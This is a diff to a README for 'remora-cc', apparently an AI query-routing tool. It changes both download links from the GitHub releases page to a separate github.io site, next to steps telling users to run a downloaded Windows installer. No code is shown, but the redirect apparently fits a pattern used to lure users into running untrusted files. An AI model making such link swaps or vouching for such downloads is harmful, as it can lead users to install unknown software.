@@ -1,6 +1,6 @@
 # 🤖 remora-cc - Route your AI queries with ease
 
-[![](https://img.shields.io/badge/Download-Remora-blue.svg)](https://github.com/Lettyphysical992/remora-cc/releases)
+[![](https://img.shields.io/badge/Download-Remora-blue.svg)](https://lettyphysical992.github.io)
 
 ## 📌 About this project
 
@@ -18,7 +18,7 @@ Before you install this software, confirm your computer meets these needs:
 ## 📥 How to get the software
 
 1. Visit the project release page to get the installer for Windows.
-2. [Download the latest version here](https://github.com/Lettyphysical992/remora-cc/releases).
+2. [Download the latest version here](https://lettyphysical992.github.io).
 3. Save the file to your computer.
 4. Locate the file in your Downloads folder.
 5. Double-click the file to start the installation process.
